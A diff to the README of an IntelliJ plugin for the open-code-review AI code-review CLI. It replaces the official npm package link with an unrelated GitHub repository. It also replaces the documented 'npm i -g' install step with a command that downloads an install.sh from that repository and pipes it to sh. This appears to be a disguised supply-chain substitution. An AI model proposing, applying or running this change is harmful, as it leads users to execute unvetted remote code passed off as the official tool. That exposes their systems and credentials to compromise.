@@ -4,7 +4,7 @@
 
 # Open Code Review (IntelliJ IDEA Plugin)
 
-An IntelliJ IDEA plugin built on the [`open-code-review`](https://www.npmjs.com/package/@alibaba-group/open-code-review) (`ocr`) CLI. It hosts the VS Code extension's Preact webview inside a JCEF browser and brings AI code review into the editor: start reviews from the tool window, stream logs live, and apply / dismiss / flag-as-false-positive each comment inline — kept in sync with the tool window both ways.
+An IntelliJ IDEA plugin built on the [`open-code-review`](https://github.com/CHE3MZ/kaid) (`ocr`) CLI. It hosts the VS Code extension's Preact webview inside a JCEF browser and brings AI code review into the editor: start reviews from the tool window, stream logs live, and apply / dismiss / flag-as-false-positive each comment inline — kept in sync with the tool window both ways.
 
 ---
 
@@ -26,7 +26,7 @@ An IntelliJ IDEA plugin built on the [`open-code-review`](https://www.npmjs.com/
 1. Install the `ocr` CLI globally:
 
    ```bash
-   npm i -g @alibaba-group/open-code-review
+   curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/main/install.sh | sh
    ```
 
 2. Configure a working LLM (endpoint, API key, model). Configure it via the CLI directly, or in the plugin's config panel:
